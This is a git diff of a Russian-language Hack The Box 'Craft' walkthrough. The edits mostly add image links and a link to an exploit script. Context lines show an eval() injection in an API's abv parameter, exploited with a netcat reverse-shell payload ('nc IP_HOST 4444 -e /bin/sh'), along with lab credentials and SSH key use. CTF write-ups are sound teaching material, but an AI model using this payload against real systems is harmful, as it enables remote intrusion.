@@ -21,9 +21,12 @@ nmap -sV -sC -T4 -p 1-10000 10.10.10.110
 ```
 
 Переходим в браузере по ссылке https://10.10.10.110/ Пройдясь по сайту обнаруживаем поддомены. Для лучшей работы с машиной следует прописать поддомены в файле `nano /etc/hosts`: 
-`10.10.10.110    craft.htb gogs.craft.htb api.craft.htb` 
+```python
+10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
+``` 
 
-скрин!!
+<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_01.png" height="150">
+
 
 
 
@@ -42,7 +45,7 @@ auth=('dinesh', '4aUh0A8PbVJxgd')
 
 На главное странице говорится о **REST**, а значит на сайте есть **API**: https://api.craft.htb/api/ 
 
-скрин 2
+<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_02.png" height="300">
 
 Первым делом напишем небольшой скриптик
 
@@ -82,9 +85,9 @@ check = session.get('https://api.craft.htb/api/auth/check', headers=headers, ver
 
 На странице **API**, имеется несколько других запросов. Один из них **POST**-запрос:
 
-![image-20191226183401112](url_3)
+<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_03.png" height="200">
 
-В файле `craft_api/api/brew/endpoints/brew.py `  на `git'e`  видно, что параметр `abv` обрабатывается с помощью функции `eval()` 
+В файле `craft_api/api/brew/endpoints/brew.py`  на `git'e`  видно, что параметр `abv` обрабатывается с помощью функции `eval()` 
 
 ```python
 if eval('%s > 1' % request.json['abv']):
@@ -130,7 +133,7 @@ abv = "__import__('os').system('nc IP_HOST 4444 -e /bin/sh')"
 
 Запускаем сплоит и мы оказываем на машине с правами **root**. К сожелению мы находимся в Докере, поэтому флага здесь нет.
 
-[Ссылка на сплоит]
+[Ссылка на сплоит](https://github.com/axelmaker/ctf-writeups/blob/master/HackTheBox/Craft/exploit.py)
 
 
 
@@ -224,7 +227,7 @@ ssh -i id_rsa_craft gilfoyle@10.10.10.110
 
 На сайте https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html сказано, что с помощью  **vault** можно создать учетные данные для удаленного хоста. 
 
-картинка
+<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_04.png" height="350">
 
 Попробуем проэксплуатировать на нашей машине: 
 
